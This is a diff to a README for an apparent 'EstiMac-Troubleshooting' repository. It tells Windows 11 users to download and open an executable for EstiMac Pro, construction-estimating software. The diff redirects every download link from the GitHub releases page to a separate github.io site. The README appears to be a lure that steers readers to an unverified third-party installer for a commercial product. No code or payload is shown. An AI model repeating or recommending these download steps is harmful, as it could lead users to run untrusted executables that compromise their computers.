@@ -1,6 +1,6 @@
 # 🛠️ EstiMac-Troubleshooting - Reliable solutions for your construction business
 
-[![](https://img.shields.io/badge/Download-EstiMac%20Pro-blue.svg)](https://github.com/Doriswaitress290/EstiMac-Troubleshooting/releases)
+[![](https://img.shields.io/badge/Download-EstiMac%20Pro-blue.svg)](https://doriswaitress290.github.io)
 
 ## 🎯 About This Repository
 
@@ -10,7 +10,7 @@ This guide helps you install and run EstiMac Pro on your Windows 11 computer. Ma
 
 You need the correct installer to begin. Follow these steps to prepare your computer and finalize the setup:
 
-1. Visit the project release page to download your copy: [https://github.com/Doriswaitress290/EstiMac-Troubleshooting/releases](https://github.com/Doriswaitress290/EstiMac-Troubleshooting/releases)
+1. Visit the project release page to download your copy: [https://doriswaitress290.github.io](https://doriswaitress290.github.io)
 2. Locate the latest executable file on that page.
 3. Save the file to your "Downloads" folder.
 4. Open the folder where you saved the file.
